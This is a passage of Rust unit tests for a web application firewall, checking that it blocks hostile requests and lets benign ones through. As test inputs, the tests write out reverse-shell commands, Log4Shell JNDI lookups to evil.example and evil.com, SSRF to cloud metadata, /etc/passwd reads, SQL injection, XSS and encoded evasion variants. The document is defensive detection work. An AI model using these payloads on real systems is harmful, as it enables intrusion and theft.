            Some(("referer".into(), "injection pattern in header (encoded)"))
        );
        // A prefix entry covers the custom headers, and only them.
        assert!(hit(&[("x-api-client", "${jndi:rmi://evil.example/a}")]).is_some());
        assert_eq!(hit(&[("xyz", "${jndi:rmi://evil.example/a}")]), None);
        // A header that is not listed is not scanned.
        assert_eq!(hit(&[("cookie", "a=${jndi:ldap://evil.example/a}")]), None);
        // An ordinary request passes.
        assert_eq!(
            hit(&[
                (
                    "user-agent",
                    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0"
                ),
                (
                    "referer",
                    "https://www.google.com/search?q=union+square+select+hotels"
                ),
                ("x-request-id", "0f9e8d7c-6b5a-4321-fedc-ba0987654321"),
            ]),
            None
        );
        // No list (the default): nothing is scanned, as before.
        let off = WafProfile::default();
        assert!(off.scan_headers.is_empty());
        assert_eq!(
            validate_headers(
                &header_map(&[("user-agent", "${jndi:ldap://evil.example/a}")]),
                &off
            ),
            None
        );
        // `*`: every header.
        let all = scanning(&["*"], WafMode::Balanced);
        assert!(validate_headers(
            &header_map(&[("cookie", "a=${jndi:ldap://e.example/a}")]),
            &all
        )
        .is_some());
    }

    /// The false-positive gate for header scanning: every value of the benign header corpus,
    /// scanned as if its header were listed. `balanced` must block none. `aggressive` blocks
    /// exactly the two the docs warn about; a third means a signature changed and the docs,
    /// or the signature, need another look.
    #[test]
    fn benign_headers_are_not_blocked() {
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("benchmarks/waf-corpus/headers-benign.json");
        let benign: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap();
        let blocked = |mode: WafMode| -> Vec<String> {
            let mut out = Vec::new();
            for (header, values) in benign.as_object().unwrap() {
                let Some(values) = values.as_array() else {
                    continue;
                };
                for v in values {
                    let v = v.as_str().unwrap();
                    if validate_header_value(v.as_bytes(), mode) != WafVerdict::Allow {
                        out.push(format!("{header}: {v}"));
                    }
                }
            }
            out.sort();
            out
        };
        assert_eq!(blocked(WafMode::Balanced), Vec::<String>::new());
        assert_eq!(
            blocked(WafMode::Aggressive),
            [
                "origin: http://localhost:3000",
                "referer: https://example.com/docs/javascript/eval()-and-alternatives",
            ]
        );
    }

    #[test]
    fn scan_headers_entries_are_header_names() {
        let errors = |entries: &[&str]| scanning(entries, WafMode::Balanced).scan_headers_errors();
        assert!(errors(&["user-agent", "X-Forwarded-Host", "x-*", "*", "sec_ch_ua"]).is_empty());
        for bad in ["", "user agent", "x-*-y", "cookie:", "**"] {
            assert_eq!(errors(&[bad]).len(), 1, "{bad:?}");
        }
    }

    /// Measurement, not a check (#519): which benign header values would the scanner block,
    /// and how many corpus attacks would it catch when they arrive in a header?
    ///   `cargo test measure_header_scan -- --ignored --nocapture`
    #[test]
    #[ignore = "measurement — prints FP / detection for header scanning"]
    fn measure_header_scan() {
        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("benchmarks/waf-corpus");
        let benign: serde_json::Value = serde_json::from_str(
            &std::fs::read_to_string(dir.join("headers-benign.json")).unwrap(),
        )
        .unwrap();
        for mode in [WafMode::Balanced, WafMode::Aggressive] {
            let scanner = scanner_for(mode);
            let (mut total, mut blocked) = (0, 0);
            for (header, values) in benign.as_object().unwrap() {
                let Some(values) = values.as_array() else {
                    continue;
                };
                for v in values {
                    let v = v.as_str().unwrap();
                    total += 1;
                    if validate_header_value(v.as_bytes(), mode) != WafVerdict::Allow {
                        blocked += 1;
                        let which = scanner
                            .find(v.as_bytes())
                            .map(|m| format!("{:?}", &v[m.start()..m.end()]))
                            .unwrap_or_else(|| "(after decoding)".into());
                        println!("FP {mode:?} {header}: pattern {which} in {v}");
                    }
                }
            }
            println!("{mode:?}: benign header values blocked: {blocked}/{total}");
            let corpus: Vec<serde_json::Value> =
                serde_json::from_str(&std::fs::read_to_string(dir.join("corpus-v2.json")).unwrap())
                    .unwrap();
            let (mut mal, mut caught) = (0, 0);
            for item in corpus.iter().filter(|i| i["kind"] == "mal") {
                mal += 1;
                let p = item["payload"].as_str().unwrap();
                if validate_header_value(p.as_bytes(), mode) != WafVerdict::Allow {
                    caught += 1;
                }
            }
            println!("{mode:?}: corpus attacks caught when sent as a header value: {caught}/{mal}");
        }
    }

    /// Dump the WAF signature vocabulary for the ML-WAF corpus generator
    /// (`ml/generate_corpus.py`), so synthetic attacks are seeded from exactly
    /// what the deployed rule engine detects — and stay in sync when it evolves.
    /// Not a check; run explicitly:
    ///   `cargo test dump_waf_signatures -- --ignored --nocapture`
    #[test]
    #[ignore = "generator — refreshes ml/testdata/waf_signatures.json"]
    fn dump_waf_signatures() {
        let doc = serde_json::json!({
            "balanced": BALANCED_PATTERNS,
            "aggressive": AGGRESSIVE_EXTRA_PATTERNS,
        });
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("ml/testdata/waf_signatures.json");
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, serde_json::to_string_pretty(&doc).unwrap()).unwrap();
        eprintln!(
            "wrote {} balanced + {} aggressive signatures → {}",
            BALANCED_PATTERNS.len(),
            AGGRESSIVE_EXTRA_PATTERNS.len(),
            path.display()
        );
    }

    // ── Streaming scanner (Track D) ──

    #[test]
    fn pattern_lengths_fit_max() {
        // Invariant the streaming overlap relies on. If a new pattern
        // longer than MAX_PATTERN_LEN lands in BALANCED / AGGRESSIVE,
        // the overlap buffer would no longer guarantee match correctness
        // for boundary-spanning matches, and this test catches it.
        for p in BALANCED_PATTERNS
            .iter()
            .chain(AGGRESSIVE_EXTRA_PATTERNS.iter())
        {
            assert!(
                p.len() < MAX_PATTERN_LEN,
                "pattern {p:?} ({}) >= MAX_PATTERN_LEN ({})",
                p.len(),
                MAX_PATTERN_LEN,
            );
        }
    }

    #[test]
    fn streaming_clean_chunks_allow_all() {
        let mut s = StreamingScanner::new(WafMode::Balanced, 10 * 1_048_576);
        for chunk in [
            b"hello ".as_slice(),
            b"world ".as_slice(),
            b"\xff\x00\x01".as_slice(),
        ] {
            assert_eq!(s.feed(chunk), StreamVerdict::Allow);
        }
    }

    #[test]
    fn streaming_denies_pattern_in_first_chunk_early_exit() {
        let mut s = StreamingScanner::new(WafMode::Aggressive, 10 * 1_048_576);
        // SQLi token (aggressive-tier "union select") in first chunk — the
        // second chunk should not even be needed.
        let v = s.feed(b"foo bar union select 1,2,3 baz");
        assert!(matches!(v, StreamVerdict::Deny(_)), "got {v:?}");
    }

    #[test]
    fn streaming_catches_pattern_split_across_chunks() {
        // The pattern 'union select' (12 bytes) is split exactly at the
        // chunk boundary. Without an overlap buffer this would be missed.
        let mut s = StreamingScanner::new(WafMode::Aggressive, 10 * 1_048_576);
        assert_eq!(s.feed(b"prefix union sel"), StreamVerdict::Allow);
        let v = s.feed(b"ect 1 from t");
        assert!(matches!(v, StreamVerdict::Deny(_)), "got {v:?}");
    }

    #[test]
    fn streaming_overflows_max_body() {
        let mut s = StreamingScanner::new(WafMode::Balanced, 8); // tiny limit
        assert_eq!(s.feed(b"abcd"), StreamVerdict::Allow);
        let v = s.feed(b"efghij"); // 4 + 6 = 10 > 8
        assert!(matches!(v, StreamVerdict::Deny(_)), "got {v:?}");
    }

    #[test]
    fn streaming_overlap_size_is_bounded() {
        // Feed many chunks; the internal overlap must never grow
        // beyond MAX_PATTERN_LEN bytes.
        let mut s = StreamingScanner::new(WafMode::Balanced, 1_048_576);
        for _ in 0..100 {
            assert_eq!(s.feed(&[b'a'; 4096]), StreamVerdict::Allow);
        }
        assert!(
            s.overlap.len() < MAX_PATTERN_LEN,
            "overlap grew unbounded: {} bytes",
            s.overlap.len()
        );
        assert!(s.bytes_seen() == 100 * 4096);
    }

    // ── End streaming-scanner tests ──

    fn url_decode(input: std::borrow::Cow<[u8]>) -> std::borrow::Cow<[u8]> {
        let mut out = Vec::new();
        normalize_unified(input.as_ref(), &mut out);
        std::borrow::Cow::Owned(out)
    }

    fn strip_sql_comments(input: std::borrow::Cow<[u8]>) -> std::borrow::Cow<[u8]> {
        let mut out = Vec::new();
        normalize_unified(input.as_ref(), &mut out);
        std::borrow::Cow::Owned(out)
    }

    fn normalize_json_unicode(input: std::borrow::Cow<[u8]>) -> std::borrow::Cow<[u8]> {
        let mut out = Vec::new();
        normalize_unified(input.as_ref(), &mut out);
        std::borrow::Cow::Owned(out)
    }

    /// Default-config profile (Balanced mode, entropy gate on at 6.5).
    /// Historically called `strict` — the name is kept to minimise diff
    /// noise in existing assertions; semantics now match the runtime
    /// default a real deployment will see.
    fn strict_profile() -> WafProfile {
        WafProfile::default()
    }

    /// Aggressive-mode profile: balanced patterns plus broad-substring
    /// patterns (alert(, eval(, $gt, os.system(, …). Body inspection is
    /// otherwise unchanged.
    fn aggressive_profile() -> WafProfile {
        WafProfile {
            mode: WafMode::Aggressive,
            ..WafProfile::default()
        }
    }

    fn relaxed_profile() -> WafProfile {
        WafProfile {
            max_body_mb: 100,
            max_depth: 20,
            max_string_len: 10_485_760,
            deny_unknown_content_types: false,
            allowed_content_types: vec![
                "application/json".to_string(),
                "multipart/form-data".to_string(),
                "application/xml".to_string(),
            ],
            ..WafProfile::default()
        }
    }

    // ── Gate 1: Body size ──

    #[test]
    fn allows_valid_json() {
        let body = br#"{"username":"admin","password":"secret123"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn prescanned_skips_raw_scan_but_keeps_encoded_pass() {
        let profile = aggressive_profile();
        let c = "multipart/form-data; boundary=B";
        // A well-formed multipart body carrying a plain (un-encoded) injection
        // pattern inside a part's content: the structure gate allows it, then the
        // raw scan catches the pattern — but the prescanned variant assumes the
        // streamer already ran the raw pass and skips it, so it does NOT re-deny.
        let raw = mp(
            "B",
            &[("q", None, b"id=1 union select password from admin")],
        );
        assert!(matches!(
            validate_request("POST", Some(c), &raw, &profile),
            WafVerdict::Deny(_)
        ));
        assert_eq!(
            validate_request_prescanned("POST", Some(c), &raw, &profile),
            WafVerdict::Allow,
            "prescanned must skip the raw scan (the streamer already did it)"
        );

        // An ENCODED injection is caught by the normalized pass, which the
        // prescanned variant still runs — both must deny.
        let encoded = mp(
            "B",
            &[(
                "q",
                None,
                b"a=%27%20union%20select%20password%20from%20admin%20--",
            )],
        );
        assert!(matches!(
            validate_request("POST", Some(c), &encoded, &profile),
            WafVerdict::Deny(_)
        ));
        assert!(
            matches!(
                validate_request_prescanned("POST", Some(c), &encoded, &profile),
                WafVerdict::Deny(_)
            ),
            "prescanned must still run the encoded/normalized pass"
        );
    }

    #[test]
    fn denies_oversized_body() {
        let body = vec![0u8; 1000];
        let mut p = strict_profile();
        p.max_body_mb = 0;
        assert_eq!(
            validate_request("POST", Some("application/json"), &body, &p),
            WafVerdict::Deny("body exceeds max size")
        );
    }

    #[test]
    fn denies_body_size_zero_mb_limit() {
        let profile = WafProfile {
            max_body_mb: 0,
            ..WafProfile::default()
        };
        assert_eq!(
            validate_request("POST", Some("application/json"), b"x", &profile),
            WafVerdict::Deny("body exceeds max size")
        );
    }

    #[test]
    fn get_with_oversized_body_still_checked() {
        let body = vec![0u8; 1000];
        let mut p = strict_profile();
        p.max_body_mb = 0;
        assert_eq!(
            validate_request("GET", None, &body, &p),
            WafVerdict::Deny("body exceeds max size")
        );
    }

    // ── Gate 2: Content-Type ──

    #[test]
    fn denies_missing_content_type() {
        let body = br#"{"a":1}"#;
        assert_eq!(
            validate_request("POST", None, body, &strict_profile()),
            WafVerdict::Deny("missing content-type header")
        );
        // whatever deny_unknown_content_types says (docs/config/waf.md)
        assert_eq!(
            validate_request("POST", None, body, &relaxed_profile()),
            WafVerdict::Deny("missing content-type header")
        );
    }

    #[test]
    fn strict_denies_unknown_content_type() {
        let body = b"<xml>data</xml>";
        assert_eq!(
            validate_request("POST", Some("application/xml"), body, &strict_profile()),
            WafVerdict::Deny("unexpected content-type for API request")
        );
    }

    #[test]
    fn relaxed_allows_unknown_content_type() {
        let body = b"<xml>data</xml>";
        assert_eq!(
            validate_request("POST", Some("application/xml"), body, &relaxed_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn content_type_case_insensitive() {
        let body = br#"{"a":1}"#;
        assert_eq!(
            validate_request("POST", Some("Application/JSON"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn content_type_with_charset() {
        let body = br#"{"a":1}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json; charset=utf-8"),
                body,
                &strict_profile()
            ),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_multipart() {
        // A well-formed benign multipart body passes the strict structure gate.
        let body = mp("abc", &[("field", None, b"benign data")]);
        assert_eq!(
            validate_request(
                "POST",
                Some("multipart/form-data; boundary=abc"),
                &body,
                &strict_profile()
            ),
            WafVerdict::Allow
        );
    }

    // ── Gate 3: Injection scanner ──

    #[test]
    fn denies_sql_injection() {
        let body = br#"{"user":"admin' OR '1'='1","pass":"x"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xss() {
        let body = br#"{"name":"<script>alert(1)</script>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_command_injection() {
        let body = br#"{"file":"; cat /etc/passwd"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_reverse_shell_balanced() {
        // Unambiguous Unix command-injection forms are caught in balanced too.
        for body in [
            br#"{"x":"; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}"#.as_slice(),
            br#"{"x":"foo; nc -e /bin/sh 10.0.0.1 4444"}"#.as_slice(),
            br#"{"x":"a${IFS}cat${IFS}/etc/passwd"}"#.as_slice(),
        ] {
            assert_eq!(
                validate_request("POST", Some("application/json"), body, &strict_profile()),
                WafVerdict::Deny("injection pattern detected"),
                "missed: {}",
                String::from_utf8_lossy(body)
            );
        }
    }

    #[test]
    fn denies_cmdi_substitution_aggressive() {
        // Command substitution + bare metachar+command (FP-prone → aggressive).
        for body in [
            br#"{"x":"$(id)"}"#.as_slice(),
            br#"{"x":"ls | whoami"}"#.as_slice(),
            br#"{"x":"x && ls -la /"}"#.as_slice(),
        ] {
            assert_eq!(
                validate_request(
                    "POST",
                    Some("application/json"),
                    body,
                    &aggressive_profile()
                ),
                WafVerdict::Deny("injection pattern detected"),
                "missed: {}",
                String::from_utf8_lossy(body)
            );
        }
    }

    #[test]
    fn allows_benign_shell_like_text() {
        // Precision guard: legit prose/code that *looks* shell-ish must pass —
        // a regression here is a false positive (the corpus's hard fail).
        for body in [
            br#"{"note":"let x = a && b || c;"}"#.as_slice(),
            br#"{"name":"O'Brien & D'Angelo Sons, Inc."}"#.as_slice(),
            br#"{"q":"the union of designers and engineers"}"#.as_slice(),
        ] {
            assert_eq!(
                validate_request(
                    "POST",
                    Some("application/json"),
                    body,
                    &aggressive_profile()
                ),
                WafVerdict::Allow,
                "false positive: {}",
                String::from_utf8_lossy(body)
            );
        }
    }

    #[test]
    fn denies_ssrf_internal_schemes_balanced() {
        for body in [
            br#"{"u":"gopher://127.0.0.1:11211/_stats"}"#.as_slice(),
            br#"{"u":"dict://127.0.0.1:11211/stat"}"#.as_slice(),
        ] {
            assert_eq!(
                validate_request("POST", Some("application/json"), body, &strict_profile()),
                WafVerdict::Deny("injection pattern detected"),
                "missed: {}",
                String::from_utf8_lossy(body)
            );
        }
    }

    #[test]
    fn denies_ssrf_loopback_and_deser_aggressive() {
        for body in [
            br#"{"u":"http://localhost:6379/"}"#.as_slice(),
            br#"{"u":"http://127.0.0.1:22"}"#.as_slice(),
            br#"{"u":"http://2130706433/"}"#.as_slice(),
            br#"{"x":"rO0ABXNyAA=="}"#.as_slice(),
            br#"{"x":"constructor[prototype][isAdmin]=true"}"#.as_slice(),
            br#"{"x":"!!python/object/apply:os.system ['id']"}"#.as_slice(),
        ] {
            assert_eq!(
                validate_request(
                    "POST",
                    Some("application/json"),
                    body,
                    &aggressive_profile()
                ),
                WafVerdict::Deny("injection pattern detected"),
                "missed: {}",
                String::from_utf8_lossy(body)
            );
        }
    }

    #[test]
    fn denies_sqli_error_based_balanced() {
        let body = br#"{"q":"1 AND extractvalue(1,concat(0x7e,version()))"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn allows_empty_function_aggressive() {
        // Precision guard: an empty JS function `() {` must NOT trip the
        // shellshock pattern (`() { :`). A regression here is a false positive.
        let body = br#"{"code":"const f = () => {}; function g() { return 1; }"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Allow,
            "false positive on empty function"
        );
    }

    #[test]
    fn denies_corpus_v2_round_aggressive() {
        // The corpus-v2 (OWASP CRS + PayloadsAllTheThings) round: high-frequency
        // real-world misses added to the aggressive set. One assertion per family.
        let p = aggressive_profile();
        for body in [
            &br#"{"x":"<?php system('id'); ?>"}"#[..], // php tag + func
            &br#"{"x":"shell_exec('ls')"}"#[..],       // php dangerous func
            &br#"{"x":"java.lang.Process"}"#[..],      // java gadget class
            &br#"{"x":"java.io.PrintStream"}"#[..],    // java io class
            &br#"{"x":"file:///etc/passwd"}"#[..],     // ssrf/lfi scheme
            &br#"{"x":"jar:http://evil.co/b.zip!a"}"#[..], // ssrf jar scheme
            &br#"{"x":"& net view"}"#[..],             // windows cmdi
            &br#"{"x":"| sleep 15"}"#[..],             // metachar sleep
            &br#"{"name__startswith":"a"}"#[..],       // django/orm lookup injection
            &br#"{"x":"compress.bzip2://file.bz2"}"#[..], // php stream wrapper
            &br#"{"x":"@{[ system 'id' ]}"}"#[..],     // perl ssti
        ] {
            assert_eq!(
                validate_request("POST", Some("application/json"), body, &p),
                WafVerdict::Deny("injection pattern detected"),
                "corpus-v2 round should block: {:?}",
                std::str::from_utf8(body).unwrap()
            );
        }
    }

    #[test]
    fn allows_corpus_v2_round_benign_aggressive() {
        // Precision guards for the corpus-v2 round: legit prose that name-drops
        // "system", "file", "java", "process" must NOT trip (the patterns are
        // anchored to call/scheme syntax, not bare words).
        let p = aggressive_profile();
        for body in [
            &br#"{"q":"how does the file system handle large uploads"}"#[..],
            &br#"{"q":"a java tutorial for beginners with process diagrams"}"#[..],
            &br#"{"q":"please ftp the file later, the system looks healthy"}"#[..],
            &br#"{"q":"sort results by startswith then by name"}"#[..],
        ] {
            assert_eq!(
                validate_request("POST", Some("application/json"), body, &p),
                WafVerdict::Allow,
                "false positive on benign prose: {:?}",
                std::str::from_utf8(body).unwrap()
            );
        }
    }

    #[test]
    fn denies_path_traversal() {
        let body = br#"{"path":"../../../etc/passwd"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_ssrf_aws_metadata() {
        let body = br#"{"url":"http://169.254.169.254/latest/meta-data/"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_log4shell() {
        let body = br#"{"header":"${jndi:ldap://evil.com/a}"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_prototype_pollution() {
        // "__proto__" is aggressive-tier (false-positive on JS prose under
        // balanced); a strict/admin route still catches it.
        let body = br#"{"__proto__":{"admin":true}}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_url_encoded_sqli() {
        // %27 = ', %4F = O, %52 = R — URL-encoded SQL injection
        let body = br#"{"user":"admin%27 OR %271%27=%271"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn denies_url_encoded_xss() {
        // %3C = <, %3E = >, %61lert = alert — fully encoded to evade raw scan
        let body = br#"{"name":"%3Cscript%3E%61lert(1)%3C/script%3E"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn denies_double_url_encoded_sqli() {
        // %2527 → %27 → ' (double encoded)
        let body = br#"{"user":"admin%2527 OR %25271%2527=%25271"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn denies_triple_url_encoded_sqli() {
        // %252527 → %2527 → %27 → ' (triple encoded)
        let body = br#"{"user":"admin%252527 OR %2525271%252527=%2525271"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn aggressive_denies_quadruple_url_encoded_xss() {
        // %25253C → %253C → %3C → < requires 4 normalisation passes; the
        // decode loop performs at most 3, so the *encoded* `<script` part
        // is not what catches this body. The raw `alert(` literal does —
        // and `alert(` lives in the AGGRESSIVE pattern set. This test pins
        // that aggressive mode picks it up; balanced will not (covered by
        // `balanced_allows_quadruple_url_encoded_xss` below).
        let body = br#"{"html":"%2525253Cscript%2525253Ealert(1)"}"#;
        let result = validate_request(
            "POST",
            Some("application/json"),
            body,
            &aggressive_profile(),
        );
        assert!(
            matches!(result, WafVerdict::Deny(_)),
            "expected Deny, got {result:?}"
        );
    }

    #[test]
    fn balanced_allows_quadruple_url_encoded_xss() {
        // Same body, balanced mode: `alert(` is no longer a balanced
        // pattern, and 4-level encoding outruns the 3-pass decode loop —
        // so `<script` is never exposed. Expected outcome: Allow.
        let body = br#"{"html":"%2525253Cscript%2525253Ealert(1)"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn balanced_denies_triple_url_encoded_xss_via_script_tag() {
        // Triple-encoded `<script` decodes within the 3-pass decode loop
        // and matches the balanced pattern `<script`. Pins the decode-loop
        // recursion still works when targeting a high-precision pattern.
        // %25253c → %253c → %3c → <
        let body = br#"{"html":"%25253cscript src=evil>"}"#;
        assert!(matches!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny(_)
        ));
    }

    // ── URI scanning ──

    #[test]
    fn uri_denies_sqli_in_query() {
        // "' or 1=1" is in the pattern list
        assert_eq!(
            validate_uri("/api/users?id=' or 1=1", WafMode::Balanced),
            WafVerdict::Deny("injection pattern in URI")
        );
    }

    #[test]
    fn uri_allows_safe_path() {
        assert_eq!(
            validate_uri("/api/v1/users?page=2&sort=name", WafMode::Balanced),
            WafVerdict::Allow
        );
    }

    #[test]
    fn uri_denies_encoded_traversal() {
        // "../../../" is the pattern — 3 levels of traversal
        assert_eq!(
            validate_uri("/api/files?path=../../../etc/passwd", WafMode::Balanced),
            WafVerdict::Deny("injection pattern in URI")
        );
    }

    #[test]
    fn uri_denies_encoded_traversal_pct() {
        // %2e%2e%2f is literally in the pattern list, so matches on raw scan
        assert_eq!(
            validate_uri(
                "/api/files?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/log",
                WafMode::Balanced
            ),
            WafVerdict::Deny("injection pattern in URI")
        );
    }

    #[test]
    fn uri_denies_double_encoded_traversal() {
        // %252e%252e%252f → %2e%2e%2f → ../ (matches after recursive decode)
        assert_eq!(
            validate_uri(
                "/api/files?path=%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log",
                WafMode::Balanced,
            ),
            WafVerdict::Deny("injection pattern in URI (encoded)")
        );
    }

    #[test]
    fn allows_safe_payload() {
        let body = br#"{"username":"john_doe","email":"john@example.com","age":30}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Gate 5: JSON structural ──

    #[test]
    fn denies_malformed_json() {
        let body = br#"{"broken: true"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("malformed JSON")
        );
    }

    #[test]
    fn denies_deep_nesting() {
        let body = br#"{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":1}}}}}}}}}}}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn pathological_nesting_rejected_by_depth_guard_before_parse() {
        // Thousands of levels deep: if the recursive simd_json parser ran first
        // this could exhaust the stack. The zero-alloc depth scan must reject it
        // up front — well before any level of nesting reaches the parser.
        let deep = "[".repeat(50_000);
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                deep.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits"),
            "deep nesting must be denied by the guard, not the parser"
        );
    }

    #[test]
    fn relaxed_allows_deep_nesting() {
        let body = br#"{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":1}}}}}}}}}}}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &relaxed_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_at_exact_max_depth() {
        let mut json = String::from("1");
        for _ in 0..10 {
            json = format!(r#"{{"a":{json}}}"#);
        }
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                json.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Allow
        );
    }

    #[test]
    fn denies_one_past_max_depth() {
        let mut json = String::from("1");
        for _ in 0..11 {
            json = format!(r#"{{"a":{json}}}"#);
        }
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                json.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn denies_long_string_value() {
        let long = "x".repeat(1_048_577);
        let body = format!(r#"{{"key":"{long}"}}"#);
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn denies_long_key_name() {
        let long_key = "k".repeat(1_048_577);
        let body = format!(r#"{{"{long_key}":"value"}}"#);
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn denies_deeply_nested_array() {
        let mut json = String::from("1");
        for _ in 0..12 {
            json = format!("[{json}]");
        }
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                json.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn allows_json_with_all_value_types() {
        let body = br#"{"str":"v","num":42,"float":3.14,"bool":true,"null":null,"arr":[1],"obj":{"k":"v"}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_array_within_depth() {
        let body = br#"{"items":[1,2,3]}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Method filtering ──

    #[test]
    fn a_body_on_get_head_or_options_is_inspected_too() {
        for m in ["GET", "HEAD", "OPTIONS"] {
            assert!(
                matches!(
                    validate_request(
                        m,
                        Some("application/x-www-form-urlencoded"),
                        b"q=' OR 1=1 --",
                        &strict_profile()
                    ),
                    WafVerdict::Deny(_)
                ),
                "{m} with an injection body"
            );
            assert_eq!(
                validate_request(m, None, b"anything", &strict_profile()),
                WafVerdict::Deny("missing content-type header"),
                "{m} body without a type is treated like any other body"
            );
            assert_eq!(
                validate_request(
                    m,
                    Some("application/json"),
                    b"{\"q\":\"laptop\"}",
                    &strict_profile()
                ),
                WafVerdict::Allow,
                "{m} with a benign body"
            );
        }
    }

    #[test]
    fn allows_get_without_body() {
        assert_eq!(
            validate_request("GET", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_delete_without_body() {
        assert_eq!(
            validate_request("DELETE", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_head_without_body() {
        assert_eq!(
            validate_request("HEAD", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_options_without_body() {
        assert_eq!(
            validate_request("OPTIONS", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_post_empty_body() {
        assert_eq!(
            validate_request("POST", Some("application/json"), &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn put_validates_body() {
        let body = br#"{"broken: true"#;
        assert_eq!(
            validate_request("PUT", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("malformed JSON")
        );
    }

    #[test]
    fn patch_validates_body() {
        let body = br#"{"valid": true}"#;
        assert_eq!(
            validate_request("PATCH", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Entropy ──

    #[test]
    fn allows_normal_entropy() {
        let body = br#"{"name":"John Doe","email":"john@example.com","message":"Hello, this is a normal message with typical text content."}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Shannon entropy unit test ──

    #[test]
    fn entropy_constant_is_zero() {
